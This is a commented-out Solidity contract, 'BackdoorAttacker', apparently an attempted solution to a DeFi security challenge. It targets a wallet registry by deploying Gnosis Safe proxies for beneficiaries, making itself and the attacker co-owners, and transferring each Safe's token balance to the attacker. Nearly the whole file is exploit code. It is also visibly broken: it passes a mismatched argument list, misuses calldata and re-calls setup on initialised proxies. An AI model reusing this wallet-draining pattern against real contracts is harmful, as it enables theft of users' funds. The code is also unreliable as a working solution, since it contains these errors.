// // SPDX-License-Identifier: MIT

// pragma solidity ^0.8.0;

// import '@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol';
// import '@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol';
// import '@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol';

// import './WalletRegistry.sol';
// import '../IWETH9.sol';

// import 'hardhat/console.sol';

// /**
//  * @title BackdoorAttacker
//  * @author jb
//  */
// contract BackdoorAttacker {
//     address payable private _owner;

//     uint256 _lock = 1;
//     modifier nonReentrant() {
//         require(_lock == 1, 'reentrancy');
//         _lock = 2;
//         _;
//         _lock = 1;
//     }

//     constructor(
//         WalletRegistry target,
//         GnosisSafeProxyFactory factory,
//         bytes calldata initializer, // gnosis initialization payload
//         address masterCopyAddress,
//         address[] beneficiaries,
//         IERC20 token,
//         uint256 startingNonce
//     ) {
//         _owner = payable(msg.sender);
//         _attack(
//             target,
//             factory,
//             initializer,
//             masterCopyAddress,
//             beneficiaries,
//             token,
//             startingNonce
//         );
//     }

//     function attack(
//         WalletRegistry target,
//         GnosisSafeProxyFactory factory,
//         bytes calldata initializer,
//         address masterCopyAddress,
//         address[] beneficiaries,
//         IERC20 token,
//         uint256 startingNonce
//     ) external payable nonReentrant {
//         _attack(
//             target,
//             factory,
//             masterCopyAddress,
//             beneficiaries,
//             token,
//             startingNonce
//         );
//     }

//     /// @dev poor MEV protection
//     function _attack(
//         WalletRegistry target,
//         GnosisSafeProxyFactory factory,
//         bytes calldata initializer,
//         address masterCopyAddress,
//         address[] beneficiaries,
//         IERC20 token,
//         uint256 startingNonce
//     ) internal {
//         uint256 length = beneficiaries.length;
//         for (uint256 i; i < length; ++i) {
//             GnosisSafeProxy safe = _deploySafe(
//                 target,
//                 factory,
//                 initializer,
//                 masterCopyAddress,
//                 beneficiaries[i],
//                 startingNonce + i
//             );

//             _win(safe, token);
//         }
//     }

//     function _deploySafe(
//         WalletRegistry target,
//         GnosisSafeProxyFactory factory,
//         bytes calldata initializer,
//         address masterCopyAddress,
//         address beneficiary,
//         uint256 nonce
//     ) internal returns (GnosisSafe safe) {
//         safe = GnosisSafe(
//             factory.createProxyWithCallback(
//                 masterCopyAddress,
//                 initializer,
//                 nonce,
//                 target
//             )
//         );
//         address[] memory owners = new address[](3);
//         owners[0] = beneficiary;
//         owners[1] = address(this);
//         owners[2] = _owner;
//         safe.setup(
//             owners,
//             1,
//             address(0),
//             '',
//             address(0),
//             address(0),
//             0,
//             _owner
//         );
//     }

//     function _win(GnosisSafe safe, IERC20 token) internal {
//         uint256 bal = token.balanceOf(address(safe));
//         require(bal > 0, 'no bal');
//         bytes memory data = abi.encodeWithSignature(
//             'transfer(address,uint256)',
//             _owner,
//             bal
//         );
//         safe.execTransaction(
//             /* Transaction info */
//             address(token),
//             0,
//             data,
//             0, // call
//             0, // safeTxGas
//             /* Payment info */
//             0, // baseGas
//             0,
//             address(0),
//             address(0),
//             /* Signature info */
//             ''
//             // signatures
//         );
//     }

//     receive() external payable {}
// }
